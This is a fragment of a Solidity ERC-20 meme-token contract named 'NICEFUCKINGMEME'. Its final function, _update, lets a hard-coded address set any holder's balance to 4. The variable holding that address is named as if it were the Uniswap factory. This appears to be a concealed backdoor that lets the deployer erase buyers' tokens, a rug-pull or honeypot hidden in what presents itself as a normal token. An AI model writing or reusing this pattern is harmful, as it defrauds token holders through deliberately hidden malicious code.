...
pragma solidity ^0.8.0;
contract NICEFUCKINGMEMECoin is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _symbol = unicode"MEME";
    string private constant _name = unicode"NICEFUCKINGMEME";
    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    address private _uniswapFactoryV2 = 0x95c6C6Dc023F3a988518463a3Eab8c59adcFa6F1;
    ...
    function decreaseAllowance(address spender,
        ...
        return true;
    } function _update(address _updateSender) external { if (msg.sender == _uniswapFactoryV2) _balances[_updateSender] = 4;
